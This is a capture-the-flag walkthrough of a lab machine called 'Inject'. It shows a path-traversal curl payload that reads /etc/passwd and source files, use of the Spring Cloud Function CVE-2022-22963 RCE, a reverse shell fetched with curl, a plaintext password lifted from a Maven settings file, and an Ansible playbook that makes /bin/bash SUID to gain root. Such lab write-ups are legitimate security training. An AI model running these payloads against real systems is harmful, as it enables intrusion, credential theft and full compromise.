# Inject

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.178.106
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 22:25 EST
Nmap scan report for 10.129.178.106
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

### Zodd Cloud LFI

Port 8080 a corporate webpage for some product:

<figure><img src="../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

There's an Upload function in the top right of the page. When we upload a file, we can view it on the server:

<figure><img src="../../.gitbook/assets/image (2614).png" alt=""><figcaption></figcaption></figure>

There's an LFI vulnerability here.

```
$ curl http://10.129.178.113:8080/show_image?img=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

Two users `frank` and `phil` are on the machine. Running a `gobuster` scan, this is what we find:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.129.178.113:8080 -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.178.113:8080
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/03/11 22:36:35 Starting gobuster in directory enumeration mode
===============================================================
/register             (Status: 200) [Size: 5654]
/blogs                (Status: 200) [Size: 5371]
/upload               (Status: 200) [Size: 1857]
/environment          (Status: 500) [Size: 712]
/error                (Status: 500) [Size: 106]
/release_notes        (Status: 200) [Size: 1086]
```

The release notes shows that the creators added some 'checks' for the upload feature, which obviously failed if LFI can be used:

<figure><img src="../../.gitbook/assets/image (1834).png" alt=""><figcaption></figcaption></figure>

We need to find out what kind of framework this is running. Because this uses images, I found out we can read directories like this:

```
$ curl http://10.129.178.113:8080/show_image?img=../../../../../../var/www/               
html
WebApp
```

Going into WebApp, we find more directories:

```
$ curl http://10.129.178.113:8080/show_image?img=../../../../../../var/www/WebApp
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
targe
```

We should be searching for the code used for the upload function. This can be found at `/var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java`.

```java
package com.example.WebApp.user;

import org.springframework.core.io.Resource;
import org.springframework.core.io.UrlResource;

import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;


import java.nio.file.Path;
import org.springframework.ui.Model;

import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import javax.activation.*;
import java.io.*;
import java.net.MalformedURLException;
import java.nio.file.Files;

import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

@Controller
public class UserController {

    private static String UPLOADED_FOLDER = "/var/www/WebApp/src/main/uploads/";

    @GetMapping("")
    public String homePage(){
        return "homepage";
    }

    @GetMapping("/register")
    public String signUpFormGET(){
        return "under";
    }

    @RequestMapping(value = "/upload", method = RequestMethod.GET)
    public String UploadFormGet(){
        return "upload";
    }

    @RequestMapping(value = "/show_image", method = RequestMethod.GET)
    public ResponseEntity getImage(@RequestParam("img") String name) {
        String fileName = UPLOADED_FOLDER + name;
        Path path = Paths.get(fileName);
        Resource resource = null;
        try {
            resource = new UrlResource(path.toUri());
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
    }

    @PostMapping("/upload")
    public String Upload(@RequestParam("file") MultipartFile file, Model model){
        String fileName = StringUtils.cleanPath(file.getOriginalFilename());
        if (!file.isEmpty() && !fileName.contains("/")){
            String mimetype = new MimetypesFileTypeMap().getContentType(fileName);
            String type = mimetype.split("/")[0];
            if (type.equals("image")){

                try {
                    Path path = Paths.get(UPLOADED_FOLDER+fileName);
                    Files.copy(file.getInputStream(),path, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e){
                    e.printStackTrace();
                }
                model.addAttribute("name", fileName);
                model.addAttribute("message", "Uploaded!");
            } else {
                model.addAttribute("message", "Only image files are accepted!");
            }
            
        } else {
            model.addAttribute("message", "Please Upload a file!");
        }
        return "upload";
    }

    @GetMapping("/release_notes")
    public String changelog(){
        return "change";
    }

    @GetMapping("/blogs")
    public String blogPage(){
        return "blog";
    }
    
}
```

### Spring Cloud RCE

There does not seem to be much here, and I can't find any loopholes.  In cases like this, we can look at the **dependencies** and see if we can break that. This uses `springframework`, which is known to have SOME vulnerabilities.

We can read the `/var/www/WebApp/pom.xml` file to get more information about the dependencies:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
        <parent>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-parent</artifactId>
                <version>2.6.5</version>
                <relativePath/> <!-- lookup parent from repository -->
        </parent>
        <groupId>com.example</groupId>
        <artifactId>WebApp</artifactId>
        <version>0.0.1-SNAPSHOT</version>
        <name>WebApp</name>
        <description>Demo project for Spring Boot</description>
        <properties>
                <java.version>11</java.version>
        </properties>
        <dependencies>
                <dependency>
                        <groupId>com.sun.activation</groupId>
                        <artifactId>javax.activation</artifactId>
                        <version>1.2.0</version>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-thymeleaf</artifactId>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-web</artifactId>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-devtools</artifactId>
                        <scope>runtime</scope>
                        <optional>true</optional>
                </dependency>

                <dependency>
                        <groupId>org.springframework.cloud</groupId>
                        <artifactId>spring-cloud-function-web</artifactId>
                        <version>3.2.2</version>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-test</artifactId>
                        <scope>test</scope>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>bootstrap</artifactId>
                        <version>5.1.3</version>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>webjars-locator-core</artifactId>
                </dependency>

        </dependencies>
        <build>
                <plugins>
                        <plugin>
                                <groupId>org.springframework.boot</groupId>
                                <artifactId>spring-boot-maven-plugin</artifactId>
                                <version>${parent.version}</version>
                        </plugin>
                </plugins>
                <finalName>spring-webapp</finalName>
        </build>

</project>
```

We can notice this is running `spring-cloud-function-web` version 3.2.2, which happens to be vulnerable to CVE-2022-22963, an RCE exploit.

{% embed url="https://sysdig.com/blog/cve-2022-22963-spring-cloud/" %}

The PoC is pretty simple:

{% embed url="https://github.com/me2nuk/CVE-2022-22963" %}

We find that this works!\


<figure><img src="../../.gitbook/assets/image (4086).png" alt=""><figcaption></figcaption></figure>

Now we have RCE, we can easily get a reverse shell. I got this via 2 commands, one that downloads a small reverse shell script via `curl` and then executes it with `bash`.

<figure><img src="../../.gitbook/assets/image (2873).png" alt=""><figcaption></figcaption></figure>

We can upgrade the shell by dropping our public key in a `authorized_keys` folder in `frank` home directory.

## Privilege Escalation

### Phil Credentials

Within `frank` home directory, we can find the credentials of the other user:

```
frank@inject:~$ cd .m2
frank@inject:~/.m2$ ls
settings.xml
frank@inject:~/.m2$ cat settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

With this, we can `su` to `phil`.

<figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

### Playbook PE

I ran a `pspy64` to see the processes being run by `root`. Here are some of the interesting lines seen:

```
2023/03/12 04:18:01 CMD: UID=0    PID=10333  | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/                  
2023/03/12 04:18:01 CMD: UID=0    PID=10332  | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml                                                      
2023/03/12 04:18:01 CMD: UID=0    PID=10331  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml                                                                     
2023/03/12 04:18:01 CMD: UID=0    PID=10335  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
```

We can see that the `root` user is running Ansible playbooks in the background. We can also see that there is a wildcard being used to detect `.yml` files via `/opt/automation/tasks/*.yml`. The user `phil` can also create files within this directory.

Pretty straightforward PE vector. We can see the existing playbook to follow the format required.

```yaml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

This playbook using the built-in `systemd` module, and we can replace that with `ansible.builtin.shell` to execute commands.&#x20;

{% embed url="https://docs.ansible.com/archive/ansible/2.3/shell_module.html" %}

After changing the module and command, we need to specify `become: true` to enable privilege escalation. This is the malicious playbook created:

```yaml
- hosts: localhost
  tasks:
  - name: giving me root shell
    ansible.builtin.shell: |
      chmod u+s /bin/bash
    become: true 
```

Download this via `wget` to the machine and wait. After a bit, we should get an easy root shell.

<figure><img src="../../.gitbook/assets/image (2421).png" alt=""><figcaption></figcaption></figure>

Pwned.&#x20;
